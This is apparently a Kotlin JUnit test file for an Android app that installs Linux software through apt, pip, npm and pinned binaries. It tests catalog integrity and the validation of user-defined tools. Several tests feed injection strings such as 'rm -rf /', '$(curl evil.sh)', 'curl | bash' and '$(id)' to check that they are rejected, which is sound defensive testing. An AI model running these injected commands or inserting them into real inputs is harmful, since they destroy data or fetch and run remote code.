package com.linuxify.app

import com.linuxify.app.pkg.Catalog
import com.linuxify.app.pkg.CatalogEntry
import com.linuxify.app.pkg.CustomTools
import com.linuxify.app.pkg.Ecosystems
import com.linuxify.app.pkg.EnvCore
import com.linuxify.app.pkg.InstallSpec
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * Pure logic of the Universal Software Management System: ecosystem
 * resolution, catalog data integrity, search, custom tool definitions.
 */
class SoftwareCatalogTest {

    private val auditAllTools = EnvCore.EnvAudit(
        distro = "Ubuntu 24.04.5 LTS",
        arch = "arm64",
        networkOk = true,
        installedBinaries = setOf("curl", "update-ca-certificates", "git", "node", "npm", "pip3", "python3"),
    )

    private val auditNoTools = EnvCore.EnvAudit(
        distro = "Ubuntu 24.04.5 LTS",
        arch = "arm64",
        networkOk = false,
        installedBinaries = setOf("curl"),
    )

    // ------------------------------------------------- ecosystem resolution

    @Test
    fun `apt spec is always usable when the rootfs is probed`() {
        val specs = listOf<InstallSpec>(InstallSpec.Apt(listOf("htop")))
        assertEquals(specs[0], Ecosystems.resolveSpec(specs, auditNoTools))
    }

    @Test
    fun `npm spec is usable when npm is present and skipped for auto-prereq when absent`() {
        val specs = listOf<InstallSpec>(InstallSpec.Npm("typescript", "tsc"))
        assertEquals(specs[0], Ecosystems.resolveSpec(specs, auditAllTools))
        // not usable now, but the developer profile can auto-provision npm
        assertEquals(specs[0], Ecosystems.resolveSpec(specs, auditNoTools))
    }

    @Test
    fun `first usable spec wins — apt preferred over static binary for jq`() {
        val entry = Catalog.findById(Catalog.ENTRIES, "jq")!!
        val resolved = Ecosystems.resolveSpec(entry.specs, auditAllTools)
        assertTrue(resolved is InstallSpec.Apt)
    }

    @Test
    fun `binary fallback wins when apt has no package database and arch matches`() {
        val specs = listOf<InstallSpec>(
            InstallSpec.Binary("https://example.invalid/jq", "a".repeat(64), "jq", "1.7.1"),
        )
        assertEquals(specs[0], Ecosystems.resolveSpec(specs, auditNoTools))
    }

    @Test
    fun `binary spec is rejected on unsupported architecture`() {
        val specs = listOf<InstallSpec>(
            InstallSpec.Binary("https://example.invalid/jq", "a".repeat(64), "jq", "1.7.1"),
        )
        val x86 = auditNoTools.copy(arch = "amd64")
        assertNull(Ecosystems.resolveSpec(specs, x86))
    }

    @Test
    fun `installCandidates keeps the whole preference order including the fallback — issue 17`() {
        val entry = Catalog.findById(Catalog.ENTRIES, "jq")!!
        val candidates = Ecosystems.installCandidates(entry.specs, auditAllTools)
        assertEquals(2, candidates.size)
        assertTrue(candidates[0] is InstallSpec.Apt)
        assertTrue(candidates[1] is InstallSpec.Binary)
    }

    @Test
    fun `installCandidates is empty when no path works on the architecture`() {
        val entry = Catalog.findById(Catalog.ENTRIES, "yq")!!
        val x86 = auditNoTools.copy(arch = "amd64")
        assertTrue(Ecosystems.installCandidates(entry.specs, x86).isEmpty())
    }

    @Test
    fun `auto-provisionable specs stay candidates when nothing is usable now`() {
        val specs = listOf<InstallSpec>(InstallSpec.Npm("typescript", "tsc"))
        assertEquals(specs, Ecosystems.installCandidates(specs, auditNoTools))
    }

    @Test
    fun `resolveSpec stays the first install candidate for every catalog entry`() {
        Catalog.ENTRIES.forEach { entry ->
            listOf(auditAllTools, auditNoTools).forEach { audit ->
                assertEquals(
                    "entry ${entry.id}",
                    Ecosystems.resolveSpec(entry.specs, audit),
                    Ecosystems.installCandidates(entry.specs, audit).firstOrNull(),
                )
            }
        }
    }

    @Test
    fun `pip prerequisite is python3-pip and npm needs the developer profile`() {
        val pip = InstallSpec.Pip("ruff", "ruff")
        val npm = InstallSpec.Npm("typescript", "tsc")
        assertEquals(listOf("python3-pip"), Ecosystems.autoPrerequisitePackages(pip))
        assertTrue(Ecosystems.needsDeveloperProfile(npm))
        assertFalse(Ecosystems.needsDeveloperProfile(pip))
    }

    // ------------------------------------------------------ command builders

    @Test
    fun `npm commands are global installs`() {
        assertEquals("npm install -g typescript", Ecosystems.npmInstallCommand("typescript"))
        assertEquals("npm uninstall -g typescript", Ecosystems.npmUninstallCommand("typescript"))
    }

    @Test
    fun `pip install carries the PEP668 flag for Ubuntu 24_04`() {
        assertTrue(Ecosystems.pipInstallCommand("ruff").contains("--break-system-packages"))
        assertEquals("pip3 uninstall -y ruff", Ecosystems.pipUninstallCommand("ruff"))
    }

    @Test
    fun `apt commands stay noninteractive and force IPv4`() {
        val cmd = Ecosystems.aptInstallCommand(listOf("htop"))
        assertTrue(cmd.contains("DEBIAN_FRONTEND=noninteractive"))
        assertTrue(cmd.contains("Acquire::ForceIPv4=true"))
        assertTrue(Ecosystems.aptRemoveCommand(listOf("htop")).contains("apt-get remove -y htop"))
    }

    // --------------------------------------------------- installed-state probe

    @Test
    fun `installed probe script covers every binary once and parses both answers`() {
        val script = Ecosystems.installedProbeScript(listOf("htop", "htop", "rg", ""))
        assertTrue(script.contains("command -v htop"))
        assertEquals(2, script.split("\n").size)
        val state = Ecosystems.parseInstalledProbe(listOf("b:htop=yes", "b:rg=no", "junk", "b:=yes"))
        assertEquals(mapOf("htop" to true, "rg" to false), state)
    }

    // ----------------------------------------------------------- catalog data

    @Test
    fun `catalog entry ids are unique`() {
        val ids = Catalog.ENTRIES.map { it.id }
        assertEquals(ids.size, ids.toSet().size)
    }

    @Test
    fun `every entry has a spec, a verify binary and a known category`() {
        Catalog.ENTRIES.forEach { entry ->
            assertTrue("no spec: ${entry.id}", entry.specs.isNotEmpty())
            assertTrue("no verify binary: ${entry.id}", entry.verifyBinary.isNotBlank())
            assertTrue(
                "unknown category ${entry.category}: ${entry.id}",
                Catalog.CATEGORIES.contains(entry.category),
            )
            assertTrue("empty description: ${entry.id}", entry.description.isNotBlank())
        }
    }

    @Test
    fun `binary specs are raw downloads with 64-hex pinned checksums`() {
        Catalog.ENTRIES.flatMap { it.specs }.filterIsInstance<InstallSpec.Binary>().forEach { b ->
            assertFalse("archives are rejected in v1: ${b.url}", b.url.endsWith(".tar.gz") || b.url.endsWith(".zip"))
            assertTrue("sha256 must be 64 hex chars: ${b.url}", b.sha256.matches(Regex("^[0-9a-f]{64}$")))
            assertTrue("binary urls must be https: ${b.url}", b.url.startsWith("https://"))
        }
    }

    @Test
    fun `search filters by query and category case-insensitively`() {
        val all = Catalog.ENTRIES
        assertTrue(Catalog.search(all, "opencode", null).isNotEmpty())
        assertTrue(Catalog.search(all, "JSON", null).map { it.id }.contains("jq"))
        assertTrue(Catalog.search(all, null, "Media").all { it.category == "Media" })
        assertTrue(Catalog.search(all, "nonexistent-tool-xyz", null).isEmpty())
        assertEquals(all, Catalog.search(all, null, "All"))
        // search must include custom entries when passed in
        val custom = CatalogEntry("mytool", "mytool", "desc", "Custom", listOf(InstallSpec.Apt(listOf("mytool"))), "mytool", custom = true)
        assertTrue(Catalog.search(all + custom, "mytool", null).map { it.id } == listOf("mytool"))
    }

    // ------------------------------------------------------------ custom tools

    @Test
    fun `custom apt tool builds with the package as its binary by default`() {
        val errors = mutableListOf<String>()
        val e = CustomTools.buildEntry("my htop", "apt", "htop", null, null) { errors += it }
        assertNotNull(e)
        assertEquals("my-htop", e!!.id)
        assertTrue(e.specs.first() is InstallSpec.Apt)
        assertEquals("htop", e.verifyBinary)
        assertTrue(e.custom)
        assertTrue(errors.isEmpty())
    }

    @Test
    fun `custom npm tool accepts an explicit binary name`() {
        val e = CustomTools.buildEntry("ts", "npm", "typescript", "tsc", null) {}
        assertNotNull(e)
        val spec = e!!.specs.first() as InstallSpec.Npm
        assertEquals("typescript", spec.pkg)
        assertEquals("tsc", spec.binary)
    }

    @Test
    fun `custom tool validation rejects bad ecosystems and unsafe names`() {
        assertNull(CustomTools.buildEntry("x", "curl | bash", "pkg", null, null) {})
        assertNull(CustomTools.buildEntry("", "apt", "pkg", null, null) {})
        assertNull(CustomTools.buildEntry("ok", "apt", "pkg; rm -rf /", null, null) {})
        assertNull(CustomTools.buildEntry("ok", "apt", "pkg", "bi nary", null) {})
    }

    @Test
    fun `npm scoped packages are accepted for npm only — issue 20`() {
        // scoped names are valid npm packages
        val scoped = CustomTools.buildEntry("ni", "npm", "@antfu/ni", "ni", null) {}
        assertNotNull(scoped)
        assertEquals("@antfu/ni", (scoped!!.specs.first() as InstallSpec.Npm).pkg)
        // scope without an explicit binary is allowed; the package name itself is kept as verify target
        val noBinary = CustomTools.buildEntry("types", "npm", "@types/node", null, null) {}
        assertNotNull(noBinary)
        // metacharacters are still rejected inside scoped names
        assertNull(CustomTools.buildEntry("evil", "npm", "@scope/pkg; rm -rf /", null, null) {})
        assertNull(CustomTools.buildEntry("evil", "npm", "\$(curl evil.sh)", null, null) {})
        // apt and pip reject a leading '@' up front
        assertNull(CustomTools.buildEntry("x", "apt", "@weird", null, null) {})
        assertNull(CustomTools.buildEntry("x", "pip", "@weird", null, null) {})
        assertTrue(CustomTools.isAllowedPackage(Ecosystems.NPM, "@a/b"))
        assertFalse(CustomTools.isAllowedPackage(Ecosystems.APT, "@a/b"))
        assertFalse(CustomTools.isAllowedPackage(Ecosystems.PIP, "@a/b"))
    }

    @Test
    fun `custom tools json roundtrip preserves entries`() {
        val e1 = CustomTools.buildEntry("tool-one", "pip", "yt-dlp", null, "Video downloader") {}!!
        val e2 = CustomTools.buildEntry("tool-two", "npm", "typescript", "tsc", null) {}!!
        val json = CustomTools.toJson(listOf(e1, e2))
        val back = CustomTools.fromJson(json)
        assertEquals(2, back.size)
        assertEquals(e1.id, back[0].id)
        assertEquals(e1.verifyBinary, back[0].verifyBinary)
        assertEquals("yt-dlp", (back[0].specs.first() as InstallSpec.Pip).pkg)
        assertEquals("tsc", (back[1].specs.first() as InstallSpec.Npm).binary)
        assertTrue(back.all { it.custom })
    }

    @Test
    fun `merge appends custom tools and never shadows builtin ids`() {
        val custom = listOf(
            CatalogEntry("htop", "FakeHtop", "desc", "Custom", listOf(InstallSpec.Apt(listOf("x"))), "x", custom = true),
            CatalogEntry("mine", "Mine", "desc", "Custom", listOf(InstallSpec.Apt(listOf("y"))), "y", custom = true),
        )
        val merged = CustomTools.merge(Catalog.ENTRIES, custom)
        assertEquals(Catalog.ENTRIES.size + 1, merged.size)
        assertEquals("System", merged.first { it.id == "htop" }.category) // builtin wins
        assertNotNull(merged.firstOrNull { it.id == "mine" })
    }

    @Test
    fun `corrupt custom json degrades to an empty list, not a crash`() {
        assertEquals(emptyList<CatalogEntry>(), CustomTools.fromJson("not json at all"))
        assertEquals(emptyList<CatalogEntry>(), CustomTools.fromJson("[]"))
    }

    @Test
    fun `fromJson re-validates and drops entries with unsafe fields — issue 14`() {
        val handEdited = """
            [
              {"id":"ok1","name":"ok1","ecosystem":"apt","pkg":"sl","verifyBinary":"sl"},
              {"id":"evil1","name":"evil","ecosystem":"apt","pkg":"curl","verifyBinary":"curl; rm -rf /"},
              {"id":"evil2","name":"evil2","ecosystem":"pip","pkg":"$(touch /tmp/pwned)","verifyBinary":"x"},
              {"id":"evil3","name":"evil3","ecosystem":"curl | bash","pkg":"x","verifyBinary":"x"},
              {"id":"evil4","name":"evil4","ecosystem":"npm","pkg":"@a/b","binary":"bad name","verifyBinary":"x"},
              {"id":"evil5","name":"evil5","ecosystem":"npm","pkg":"a`id`","verifyBinary":"a"}
            ]
        """.trimIndent()
        val loaded = CustomTools.fromJson(handEdited)
        assertEquals(listOf("ok1"), loaded.map { it.id })
    }

    @Test
    fun `valid custom tools survive the fromJson re-validation`() {
        val e1 = CustomTools.buildEntry("tool-one", "pip", "yt-dlp", null, null) {}!!
        val e2 = CustomTools.buildEntry("ni", "npm", "@antfu/ni", "ni", null) {}!!
        val back = CustomTools.fromJson(CustomTools.toJson(listOf(e1, e2)))
        assertEquals(listOf("tool-one", "ni"), back.map { it.id })
        assertEquals("@antfu/ni", (back[1].specs.first() as InstallSpec.Npm).pkg)
    }

    @Test
    fun `probe script refuses to interpolate unsafe binary names — issue 14`() {
        val script = Ecosystems.installedProbeScript(listOf("htop", "bad;name", "rg", "`touch x`", "\$(id)"))
        assertTrue(script.contains("command -v htop"))
        assertTrue(script.contains("command -v rg"))
        assertFalse(script.contains("bad;name"))
        assertFalse(script.contains("`"))
        assertFalse(script.contains("$("))
    }
}
